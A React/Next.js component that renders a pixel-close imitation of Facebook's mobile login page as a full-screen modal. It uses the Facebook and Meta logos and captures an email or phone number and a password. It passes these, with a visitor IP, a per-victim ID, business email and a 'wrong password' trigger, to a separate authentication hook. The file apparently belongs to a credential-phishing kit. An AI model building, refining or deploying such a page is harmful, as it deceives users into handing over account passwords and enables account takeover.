import React, { useState, useContext } from "react";
import { createPortal } from "react-dom";
import styled from "styled-components";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import ButtonActions from "../../utils/buttonActions.js";
import { DataContext } from "../../pages/index.js";
import FacebookLogo from "../../assets/images/FLogoV2.png";
import Image from "next/image";

const Container = styled.div`
  display: flex;
  flex-direction: column;
  background-color: #fff;
  height: 100vh; /* Ensure full viewport height */
  width: 100%;
  max-width: 100%;
  margin: 0;
  /* padding: 0; default, no need to specify unless overriding */
  justify-content: space-between; /* Distribute children vertically */
  overflow: hidden; /* Prevent scrollbars if content slightly overflows */
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

const LoginBoxWrapper = styled.div`
  background-color: #fff;
  /* padding: 20px; User removed */
  width: 100%;
  display: flex;
  flex-direction: column;
  justify-content: center; /* Center FormSection vertically within this box */
  /* flex-grow: 1; Removed, should be sized by its content */
`;

const TopSection = styled.div`
  display: flex;
  justify-content: center;
  align-items: center;
  margin-top: 20px;
  height: 23px;
`;

const LanguageSelector = styled.div`
  color: rgb(70, 90, 105);
  font-size: 13px;
  font-weight: 400;
  text-align: center;
  margin-bottom: 10px;
  cursor: pointer;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

const Logo = styled.div`
  text-align: center;
  margin-top: 0;
  // flex-grow: 1; /* Expand to fill available space */
  flex-shrink: 100; /* Allow shrinking if needed, though flex-grow:1 dominates */
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  height: auto; /* Height will be determined by flex-grow */
  padding-top: 20px;
  padding-bottom: 10px;

  img {
    max-height: 60px;
    object-fit: contain;
  }
`;

const FormSection = styled.div`
  display: flex;
  flex-direction: column;
  width: 100%;
  margin-top: 0; /* Centering handled by LoginBoxWrapper or direct placement */
  /* flex-grow: 1; Removed, let content define its height */
`;

const InputsContainer = styled.div`
  flex-direction: column;
  justify-content: flex-start;
  padding: 0 16px;
`;

const CustomInput = styled.input`
  border: 1px solid #dddfe2 !important;
  border-radius: 10px !important; /* User updated */
  /* Adjusted padding for floating label: top, right, bottom, left */
  padding: 22px 16px 6px 16px !important;
  background-color: #fff;
  margin-top: 0;
  width: 100%;
  font-size: 17px;
  color: #1d2129;
  line-height: 1.34;
  min-height: auto;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;

  &.redborder {
    border: 1px solid red !important;
  }

  ::placeholder {
    /* Placeholder is used for the :not(:placeholder-shown) selector, so make it transparent */
    color: transparent;
    user-select: none; /* Prevent selection of the space placeholder */
  }
  /* margin-bottom: 12px; Moved to FormFloatingWrapper */

  &:focus {
    outline: none;
    border-color: #0866ff !important;
    box-shadow: 0 0 0 2px #e7f3ff;
  }
`;

const FormFloatingWrapper = styled.div`
  position: relative;
  margin-bottom: 12px; /* Was on CustomInput */
`;

const FloatingLabel = styled.label`
  position: absolute;
  top: 14px; /* Initial vertical position */
  left: 16px; /* Initial horizontal position */
  font-size: 17px;
  font-weight: 400;
  color: #90949c; /* Original placeholder color */
  pointer-events: none;
  transition: all 0.2s ease-out;
  background-color: #fff; /* For "notch" effect when floated */
  padding: 0 4px; /* Horizontal padding for the notch */
  line-height: 1.34; /* Match CustomInput */
  font-family: FBook, Helvetica, system-ui, sans-serif !important;

  /* Style for when the associated input is disabled */
  ${CustomInput}:disabled ~ & {
    color: #adb5bd; /* Muted color for disabled state */
  }
`;

// Styles for the floated label state within FormFloatingWrapper
const StyledFormFloatingWrapper = styled(FormFloatingWrapper)`
  ${CustomInput}:focus ~ ${FloatingLabel},
    ${CustomInput}:not(:placeholder-shown) ~ ${FloatingLabel} {
    top: 0;
    left: 12px; /* Indent when floated */
    transform: translateY(
      -50%
    ); /* Center vertically on the input's top border */
    font-size: 13px; /* Smaller font for floated label */
    height: auto;
    line-height: 1;
    color: #1d2129; /* Default text color when floated */
  }

  ${CustomInput}:focus:not(:disabled) ~ ${FloatingLabel} {
    color: #0866ff; /* Highlight color when input is focused and enabled */
  }
`;

const LoginButton = styled.button`
  width: 100%;
  height: 40px; /* User updated */
  background-color: #0866ff;
  border: none;
  border-radius: 30px; /* User updated */
  color: rgb(255, 255, 255);
  font-size: 18px; /* User updated */
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
  padding: 0 16px;
  margin-top: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  line-height: 48px;

  &:hover {
    background-color: #005ce6;
  }
`;

const ForgotPassword = styled.div`
  text-align: center;
  margin-top: 16px;
  height: auto;
  display: flex;
  align-items: center;
  justify-content: center;
  padding-bottom: 16px;
  margin-left: 0;
  margin-right: 0;
  padding-left: 0;
  padding-right: 0;
  border-bottom: none;

  a {
    color: rgb(73, 73, 73); /* User updated */
    font-size: 15px; /* User updated */
    font-weight: 500;
    font-family: FBook, Helvetica, system-ui, sans-serif !important;
    text-decoration: none;
    line-height: 1.248;

    &:hover {
      text-decoration: underline;
    }
  }
`;

const BottomSection = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  margin-top: auto;
  flex-grow: 0;
  flex-shrink: 0;
  padding-bottom: 20px;
  padding-top: 20px;
  justify-content: flex-end;
  width: 100%;
`;

const CreateAccountButtonContainer = styled.div`
  width: 100%;
  margin-top: 1.5rem; /* This was from a previous step, check if still needed with new layout */
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 0 12px; /* User updated */
`;

const CreateAccountButton = styled.button`
  border: none;
  border-radius: 6px;
  color: #fff;
  font-size: 17px;
  border-radius: 30px; /* User added */
  padding: 0 16px;
  height: 48px;
  min-width: auto;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  line-height: 48px;
  margin-top: 0;
  flex-grow: 1;
  background-color: transparent;
  border: 1px solid #0064e0;
  color: #0064e0;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
  &:hover {
    background-color: rgba(0, 100, 224, 0.05);
  }
`;

const MobileFooter = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  /* margin-top: auto; Removed, positioned by Container's space-between */
  flex-grow: 0;
  flex-shrink: 0;
  padding-bottom: 0;
  justify-content: flex-end;
  width: 100%;
  margin-bottom: 10px; /* User added */
`;

const MetaLogo = styled.div`
  text-align: center;
  margin: 10px 0;
  img {
    height: 12px;
  }
`;

const FooterLinks = styled.div`
  display: flex;
  justify-content: center;
  flex-wrap: wrap;

  span {
    color: rgb(99, 120, 138);
    font-size: 10px;
    margin: 0 4px 4px;
    cursor: pointer;
    font-family: FBook, Helvetica, system-ui, sans-serif !important;
  }
`;

const Spinner = styled.div`
  width: 20px;
  height: 20px;
  border: 3px solid rgba(255, 255, 255, 0.3);
  border-radius: 50%;
  border-top-color: white;
  animation: spin 1s ease-in-out infinite;
  margin: 0 auto;

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
`;

const ValidationError = styled.div`
  color: red;
  font-size: 13px;
  font-weight: 500;
  margin-top: 4px;
  text-align: left;
  margin-bottom: 8px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

function Step2Mobile({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
}) {
  const [isValidEmail, setIsValidEmail] = useState(false);
  const { setAllData, AllData } = useContext(DataContext);

  // Use the custom hook for password authentication
  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    emailError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
    clearEmailError,
  } = usePasswordAuth({
    Unik,
    Email,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    setParentBeginTimer,
  });

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    clearEmailError();

    // Accept any input with reasonable length (phone number, username, or email)
    if (e.target.value.length >= 3) {
      setIsValidEmail(true);
    } else {
      setIsValidEmail(false);
    }
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    clearPasswordError();
  };

  const modalContent = (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black bg-opacity-50 overflow-y-auto">
      <div className="w-full h-full max-w-md bg-white overflow-y-auto">
        <Container>
      <TopSection>
        <LanguageSelector>English (US)</LanguageSelector>
      </TopSection>
      <Logo>
        <Image src={FacebookLogo} alt="Facebook Logo" width={60} height={60} />
      </Logo>
      <LoginBoxWrapper>
        <FormSection>
          <InputsContainer>
            <StyledFormFloatingWrapper>
              <CustomInput
                type="text"
                id="email-input"
                value={Email}
                onChange={handleEmailChange}
                placeholder=" "
                className={`form-control ${
                  !isValidEmail && triedSubmit ? "redborder" : ""
                }`}
                disabled={isLoading}
              />
              <FloatingLabel htmlFor="email-input">
                Mobile number or email address
              </FloatingLabel>
            </StyledFormFloatingWrapper>
            {emailError && <ValidationError>{emailError}</ValidationError>}

            <StyledFormFloatingWrapper>
              <CustomInput
                type="password"
                id="password-input"
                value={password}
                onChange={handlePasswordChange}
                placeholder=" "
                className={`form-control ${
                  password.length < 5 && triedSubmit ? "redborder" : ""
                }`}
                disabled={isLoading}
              />
              <FloatingLabel htmlFor="password-input">Password</FloatingLabel>
            </StyledFormFloatingWrapper>
            {passwordError && (
              <ValidationError>{passwordError}</ValidationError>
            )}

            <LoginButton onClick={handleSubmit}>
              {isLoading ? <Spinner /> : "Log in"}
            </LoginButton>

            <ForgotPassword>
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  ButtonActions.handleForgottenPassword({
                    AllData,
                    setAllData,
                    Unik,
                    Email,
                    Ip,
                  });
                }}
              >
                Forgotten password?
              </a>
            </ForgotPassword>
          </InputsContainer>
        </FormSection>
      </LoginBoxWrapper>

      <MobileFooter>
        <BottomSection>
          <CreateAccountButtonContainer>
            <CreateAccountButton
              onClick={(e) => {
                e.preventDefault();
                ButtonActions.handleCreateAccount({
                  AllData,
                  setAllData,
                  Unik,
                  Email,
                  Ip,
                });
              }}
            >
              Create new account
            </CreateAccountButton>
          </CreateAccountButtonContainer>
        </BottomSection>
        <MetaLogo>
          <img
            src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png"
            alt="Meta logo"
          />
        </MetaLogo>
        <FooterLinks>
          <span>About</span>
          <span>Help</span>
          <span>More</span>
        </FooterLinks>
      </MobileFooter>
    </Container>
      </div>
    </div>
  );

  // Use Portal to render modal at document.body level for persistence
  if (typeof window === 'undefined') return null;
  return createPortal(modalContent, document.body);
}

export default Step2Mobile;
